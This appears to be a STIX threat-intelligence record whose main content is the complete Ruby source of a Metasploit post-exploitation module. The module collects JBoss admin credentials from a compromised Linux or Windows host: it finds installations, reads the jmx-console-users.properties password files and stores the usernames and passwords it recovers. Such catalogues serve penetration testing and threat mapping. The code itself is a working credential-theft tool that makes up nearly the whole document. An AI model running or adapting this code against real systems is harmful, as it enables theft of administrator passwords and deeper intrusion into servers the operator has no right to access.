{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6ff1dd41-511c-4600-86c7-c247aa5df7ca",
    "created": "2024-08-14T16:33:19.162347Z",
    "modified": "2024-08-14T16:33:19.16235Z",
    "name": "Jboss Credential Collector",
    "description": " This module can be used to extract the Jboss admin passwords for version 4,5 and 6.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/jboss_gather.rb",
            "external_id": "jboss_gather.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Jboss Credential Collector',\n        'Description' => %q{\n          This module can be used to extract the Jboss admin passwords for version 4,5 and 6.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Koen Riepe (koen.riepe@fox-it.com)' ],\n        'Platform' => [ 'linux', 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n  end\n\n  def report_creds(user, pass, port)\n    return if (user.empty? || pass.empty?)\n\n    # Assemble data about the credential objects we will be creating\n    credential_data = {\n      origin_type: :session,\n      post_reference_name: fullname,\n      private_data: pass,\n      private_type: :password,\n      session_id: session_db_id,\n      username: user,\n      workspace_id: myworkspace_id\n    }\n\n    credential_core = create_credential(credential_data)\n\n    if !port.is_a? Integer\n      print_error('Failed to detect port, defaulting to 8080 for creds database')\n      port = 8080\n    end\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),\n      port: port,\n      service_name: 'jboss',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    create_credential_login(login_data)\n  end\n\n  def getpw(file, ports)\n    i = 0\n    file.each do |pwfile|\n      begin\n        print_status(\"Getting passwords from: #{pwfile}\")\n        lines = read_file(pwfile).split(\"\\n\")\n      rescue StandardError\n        print_error(\"Cannot open #{pwfile}, you probably do not have permissions to open the file.\")\n        next\n      end\n      for line in lines\n        next if line.include? '#'\n\n        creds = line.split('=')\n        print_good(\"Credentials found - Username: #{creds[0]} Password: #{creds[1]}\")\n        report_creds(creds[0], creds[1], ports[i])\n      end\n      i += 1\n    end\n  end\n\n  def getversion(array)\n    i = 0\n    version = 'NONE'\n    results = []\n    while i < array.count\n      downcase = array[i].downcase\n      if downcase.include? 'jboss'\n        begin\n          file = read_file(array[i])\n        rescue StandardError\n          print_error(\"Cannot open #{array[i]}, you probably do not have permissions to open the file.\")\n          next\n        end\n        xml_doc = Nokogiri::XML(file)\n        xml_doc.xpath('//jar-versions//jar').each do |node|\n          if node['name'] == 'jbossweb.jar'\n            version = node['specVersion'][0]\n            results.push(version)\n          end\n        end\n      end\n      if version != 'NONE'\n        print_status(\"Found a Jboss installation version: #{version}\")\n        home = readhome(cmd_exec('printenv').split(\"\\n\"))\n        pwfiles = getpwfiles(cmd_exec('locate jmx-console-users.properties').split(\"\\n\"), home, version)\n        listenports = getports(version)\n        getpw(pwfiles, listenports)\n      end\n      i += 1\n    end\n  end\n\n  def wingetversion(array, home)\n    i = 0\n    version = 'NONE'\n    results = []\n    while i < array.count\n      downcase = array[i].downcase\n      if downcase.include? 'jboss'\n        file = read_file(array[i])\n        xml_doc = Nokogiri::XML(file)\n        xml_doc.xpath('//jar-versions//jar').each do |node|\n          if node['name'] == 'jbossweb.jar'\n            version = node['specVersion'][0]\n            results.push(version)\n          end\n        end\n      end\n      if version != 'NONE'\n        print_status(\"Found a Jboss installation version: #{version}\")\n        instances = wingetinstances(home, version)\n        pwfiles = winpwfiles(instances)\n        listenports = wingetport(instances)\n        getpw(pwfiles, listenports)\n      end\n      i += 1\n    end\n  end\n\n  def readhome(array)\n    home = ''\n    array.each do |item|\n      if item.include? 'JBOSS_HOME'\n        home = item.split('JBOSS_HOME=')[1]\n      end\n    end\n    return home\n  end\n\n  def getpwfiles(array, home, version)\n    pwfiles = []\n    array.each do |location|\n      if location.include?(home && version)\n        pwfiles.push(location)\n      end\n    end\n    return pwfiles\n  end\n\n  def getports(version)\n    type1 = cmd_exec('locate bindings-jboss-beans.xml').split(\"\\n\")\n    type2 = cmd_exec('locate jboss-web.deployer/server.xml').split(\"\\n\")\n    port = []\n    type1.each do |file1|\n      next unless file1 && file1.include?(version)\n\n      print_status(\"Attempting to extract Jboss service ports from: #{file1}\")\n      begin\n        file1_read = read_file(file1).split(\"\\n\")\n      rescue StandardError\n        print_error(\"Cannot open #{file1}, you probably do not have permissions to open the file.\")\n        next\n      end\n      parse = false\n      portfound = false\n      file1_read.each do |line|\n        if line.strip.include? 'deploy/httpha-invoker.sar'\n          parse = true\n        elsif ((line.strip == '</bean>') && portfound)\n          parse = false\n        elsif parse && line.include?('<property name=\"port\">')\n          portnr = line.split('<property name=\"port\">')[1].split('<')[0].to_i\n          port.push(portnr)\n          portfound = true\n          print_good(\"Jboss port found: #{portnr}\")\n        end\n      end\n    end\n\n    type2.each do |file2|\n      next unless file2 && file2.include?(version)\n\n      print_status(\"Attempting to extract Jboss service ports from: #{file2}\")\n      begin\n        xml2 = Nokogiri::XML(read_file(file2))\n      rescue StandardError\n        print_error(\"Cannot open #{file2}, you probably do not have permissions to open the file.\")\n        next\n      end\n      xml2.xpath('//Server//Connector').each do |connector|\n        next unless connector['protocol'].include? 'HTTP'\n\n        portnr = connector['port'].to_i\n        port.push(portnr)\n        print_good(\"Jboss port found: #{portnr}\")\n        break\n      end\n    end\n    return port\n  end\n\n  def gathernix\n    print_status('Unix OS detected, attempting to locate Jboss services')\n    version = getversion(cmd_exec('locate jar-versions.xml').split(\"\\n\"))\n  end\n\n  def winhome\n    home = []\n    exec = cmd_exec('WMIC PROCESS get Caption,Commandline').split(\"\\n\")\n    exec.each do |line|\n      next unless line.downcase.include?('java.exe') && line.downcase.include?('jboss')\n\n      print_status('Jboss service found')\n      parse = line.split('-classpath \"')[1].split('\\\\bin\\\\')[0]\n      if parse[0] == ';'\n        home.push(parse.split(';')[1])\n      else\n        home.push(parse)\n      end\n    end\n    return home\n  end\n\n  def wingetinstances(home, version)\n    instances = []\n    instance_location = \"#{home}\\\\server\"\n    exec = cmd_exec(\"cmd /c dir #{instance_location}\").split(\"\\n\")\n    exec.each do |instance|\n      next unless instance.split('<DIR>')[1] && ((!instance.split('<DIR>')[1].strip.include? '.') && (!instance.split('<DIR>')[1].strip.include? '..'))\n\n      instance_path = \"#{home}\\\\server\\\\#{instance.split('<DIR>')[1].strip}\"\n      if instance_path.include? version\n        instances.push(instance_path)\n      end\n    end\n    return instances\n  end\n\n  def winpwfiles(instances)\n    files = []\n    instances.each do |seed|\n      file_path = \"#{seed}\\\\conf\\\\props\\\\jmx-console-users.properties\"\n      if exist?(file_path)\n        files.push(file_path)\n      end\n    end\n    return files\n  end\n\n  def wingetport(instances)\n    port = []\n    instances.each do |seed|\n      path1 = \"#{seed}\\\\conf\\\\bindingservice.beans\\\\META-INF\\\\bindings-jboss-beans.xml\"\n      path2 = \"#{seed}\\\\deploy\\\\jboss-web.deployer\\\\server.xml\"\n\n      if exist?(path1)\n        file1 = read_file(\"#{seed}\\\\conf\\\\bindingservice.beans\\\\META-INF\\\\bindings-jboss-beans.xml\").split(\"\\n\")\n      end\n\n      if exist?(path2)\n        file2 = read_file(\"#{seed}\\\\deploy\\\\jboss-web.deployer\\\\server.xml\")\n      end\n\n      if file1\n        print_status(\"Attempting to extract Jboss service ports from: #{seed}\\\\conf\\\\bindingservice.beans\\\\META-INF\\\\bindings-jboss-beans.xml\")\n        parse = false\n        portfound = false\n        file1.each do |line|\n          if line.strip.include? 'deploy/httpha-invoker.sar'\n            parse = true\n          elsif ((line.strip == '</bean>') && portfound)\n            parse = false\n          elsif parse && line.include?('<property name=\"port\">')\n            portnr = line.split('<property name=\"port\">')[1].split('<')[0].to_i\n            port.push(portnr)\n            portfound = true\n            print_good(\"Jboss port found: #{portnr}\")\n          end\n        end\n      end\n\n      next unless file2\n\n      print_status(\"Attempting to extract Jboss service ports from: #{seed}\\\\deploy\\\\jboss-web.deployer\\\\server.xml\")\n      xml2 = Nokogiri::XML(file2)\n      xml2.xpath('//Server//Connector').each do |connector|\n        next unless connector['protocol'].include? 'HTTP'\n\n        portnr = connector['port'].to_i\n        port.push(portnr)\n        print_good(\"Jboss port found: #{portnr}\")\n        break\n      end\n    end\n    return port\n  end\n\n  def gatherwin\n    print_status('Windows OS detected, enumerating services')\n    homeArray = winhome\n    if !homeArray.empty?\n      homeArray.each do |home|\n        version_file = []\n        version_file.push(\"#{home}\\\\jar-versions.xml\")\n        version = wingetversion(version_file, home)\n      end\n    else\n      print_status('No Jboss service has been found')\n    end\n  end\n\n  def run\n    if sysinfo['OS'].include? 'Windows'\n      gatherwin\n    else\n      gathernix\n    end\n  rescue StandardError\n    print_error('sysinfo function not available, you are probably using a wrong meterpreter.')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux', 'win' ]"
    ]
}